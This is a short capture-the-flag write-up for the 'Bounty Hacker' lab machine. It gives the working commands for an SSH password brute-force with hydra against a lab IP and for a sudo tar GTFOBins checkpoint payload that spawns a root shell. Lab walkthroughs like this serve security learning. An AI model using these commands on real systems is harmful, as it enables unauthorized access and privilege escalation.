# Bounty Hacker
## Enumeration
+ Ran nmap initial scan.
+ Found FTP, SSH and Apache running on machine.
+ Obtained password list and username hints.
+ Used hydra to obtain creds: `hydra -l lin -P locks.txt 10.10.38.221 -t 4 ssh`

## Exploitation 
+ Logged into machine as lin.

## Privilege Escalation
+ Ran `sudo -l` to check permissions.
+ User `lin` can run `/bin/tar` as root.
+ Obtained payload using GTFOBins to get root: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`